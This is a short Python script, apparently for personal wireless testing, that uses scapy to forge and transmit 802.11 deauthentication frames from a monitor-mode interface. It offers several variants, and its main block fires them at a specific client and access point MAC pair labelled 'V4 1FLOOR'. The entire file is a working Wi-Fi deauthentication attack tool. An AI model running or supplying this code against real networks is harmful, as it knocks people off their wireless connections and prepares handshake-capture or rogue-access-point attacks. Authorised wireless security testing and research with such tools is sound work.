from scapy.all import *
import warnings
# from cryptography.utils import CryptographyDeprecationWarning
from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11

interface_name: str = "wlp9s0mon"
# interface_name: str = "wlan0mon"


def deauth_test1(client_mac: str,
                 access_point_mac: str,
                 count: int = 3,
                 interface: str = interface_name):
    pkt: Any = RadioTap() / Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / Dot11Deauth()
    return sendp(pkt, iface=interface, count=int(count), inter=0.2)


def deauth_test1_1(client_mac: str,
                   access_point_mac: str,
                   count: int = 3,
                   interface: str = interface_name):
    pkt: Any = RadioTap() / Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / Dot11Deauth()
    packet = pkt.build()
    sock = conf.L2socket(iface=interface)
    for _ in range(count):
        sock.send(packet)


def deauth_test1_2(client_mac: str,
                   access_point_mac: str,
                   count: int = 3,
                   interface: str = interface_name):
    pkt: Any = RadioTap() / Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / Dot11Deauth()
    packet = pkt.build()
    sock = conf.L2socket(iface=interface)
    for _ in range(count):
        sock.send(packet)


def deauth_test2(client_mac: str,
                 access_point_mac: str,
                 count: int = 3,
                 interface: str = interface_name):
    pkt: Any = Dot11(addr1=client_mac, addr2=access_point_mac, addr3=access_point_mac) / Dot11Deauth()
    return sendp(pkt, iface=interface, count=int(count), inter=0.2)


if __name__ == "__main__":
    # pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()

    deauth_test1(client_mac="18:F0:E4:1F:B2:84", access_point_mac='F6:8C:EB:27:6C:AA', count=1)  # V4 1FLOOR
    # deauth_test1_1(client_mac="18:F0:E4:1F:B2:84", access_point_mac='F6:8C:EB:27:6C:AA', count=1)  # V4 1FLOOR
    # deauth_test1_2(client_mac="18:F0:E4:1F:B2:84", access_point_mac='F6:8C:EB:27:6C:AA', count=1)  # V4 1FLOOR

    deauth_test1(client_mac="01:01:01:01:01:01", access_point_mac='F6:8C:EB:27:6C:AA')
